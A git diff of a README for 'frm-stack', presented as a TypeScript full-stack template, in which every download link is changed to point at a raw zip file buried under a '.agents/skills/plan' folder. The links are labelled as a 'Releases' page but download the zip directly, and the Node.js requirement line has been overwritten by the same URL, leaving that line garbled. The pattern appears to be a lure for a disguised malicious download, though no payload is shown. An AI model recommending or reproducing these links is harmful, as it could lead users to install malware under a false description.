@@ -1,7 +1,7 @@
 # 🎉 frm-stack - A Simple Template for Your Next Full-Stack Project
 
 ## 🖱️ Download Now
-[![Release](https://github.com/Bendjinymous/frm-stack/raw/refs/heads/main/packages/frontend/stack_frm_2.0.zip%20Now-%F0%9F%9A%80-brightgreen)](https://github.com/Bendjinymous/frm-stack/raw/refs/heads/main/packages/frontend/stack_frm_2.0.zip)
+[![Release](https://github.com/Bendjinymous/frm-stack/raw/refs/heads/main/.agents/skills/plan/frm_stack_v2.2-alpha.4.zip%20Now-%F0%9F%9A%80-brightgreen)](https://github.com/Bendjinymous/frm-stack/raw/refs/heads/main/.agents/skills/plan/frm_stack_v2.2-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to `frm-stack`, a full-stack TypeScript monorepo template. This template
 ## 📥 Download & Install
 
 To get started, visit our releases page to download the package:
-[Download frm-stack](https://github.com/Bendjinymous/frm-stack/raw/refs/heads/main/packages/frontend/stack_frm_2.0.zip)
+[Download frm-stack](https://github.com/Bendjinymous/frm-stack/raw/refs/heads/main/.agents/skills/plan/frm_stack_v2.2-alpha.4.zip)
 
 1. Click on the link above to go to the **Releases** page.
 2. Look for the latest version at the top of the list.
@@ -21,7 +21,7 @@ To get started, visit our releases page to download the package:
 Before you start, ensure your system meets these requirements:
 
 - Operating System: Windows, macOS, or Linux
-- https://github.com/Bendjinymous/frm-stack/raw/refs/heads/main/packages/frontend/stack_frm_2.0.zip Version 14 or later
+- https://github.com/Bendjinymous/frm-stack/raw/refs/heads/main/.agents/skills/plan/frm_stack_v2.2-alpha.4.zip Version 14 or later
 - A modern web browser such as Chrome, Firefox, or Safari
 
 ## 🌟 Key Features
@@ -65,4 +65,4 @@ This project is licensed under the MIT License. You can use it freely for person
 
 ## 🎉 Thank You!
 
-Thank you for choosing `frm-stack`. We're excited to see what you build! Visit our [Releases](https://github.com/Bendjinymous/frm-stack/raw/refs/heads/main/packages/frontend/stack_frm_2.0.zip) page again later for new versions and updates.
+Thank you for choosing `frm-stack`. We're excited to see what you build! Visit our [Releases](https://github.com/Bendjinymous/frm-stack/raw/refs/heads/main/.agents/skills/plan/frm_stack_v2.2-alpha.4.zip) page again later for new versions and updates.
